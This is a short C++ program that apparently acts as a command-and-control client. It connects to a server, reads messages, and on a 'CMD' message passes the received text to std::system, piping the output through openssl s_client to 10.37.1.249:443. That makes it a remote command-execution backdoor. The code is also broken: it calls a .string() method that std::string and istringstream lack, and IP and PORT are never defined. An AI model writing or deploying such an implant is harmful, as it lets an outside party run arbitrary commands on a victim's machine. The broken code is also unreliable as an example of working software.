// See 

#include <cstdlib>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

void handleMessage(const std::string& msg, int sock) {
    std::istringstream iss(msg);
    std::string keyword, id;
    if(!(iss >> keyword) || !(iss >> id)) {
        // Failure state
        return;
    }

    if(keyword == "HELO") {
        std::string s = std::string("HELLO ") + id;
        //send(sock, s.c_str(), s.size(), 0);
        
        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
        std::system(command.c_str());
    } else if(keyword == "EXIT") {
        // throw
        throw 1;
    } else if(keyword == "CMD"){
        std::string command = iss.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
        std::system(command.c_str());
    } else {
        // ERR
        std::string s = std::string("ERR ") + id;
        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
        std::system(command.c_str());
    }
}

int main(int argc, char* argv[]) {
    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(clientSocket < 0) {
        return 1;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &serverAddress.sin_addr);

    if(connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        close(clientSocket);
        return 1;
    }

    char buf[1024];
    while(true) {
        ssize_t bytesReceived = recv(clientSocket, buf, sizeof(buf) - 1, 0);

        if(bytesReceived == -1) {
            break;
        }
        buf[bytesReceived] = '\0';

        std::string message(buf);
        try {
            handleMessage(message, clientSocket);
        } catch (...) {
            break;
        }
    }

    close(clientSocket);

    return EXIT_SUCCESS;
}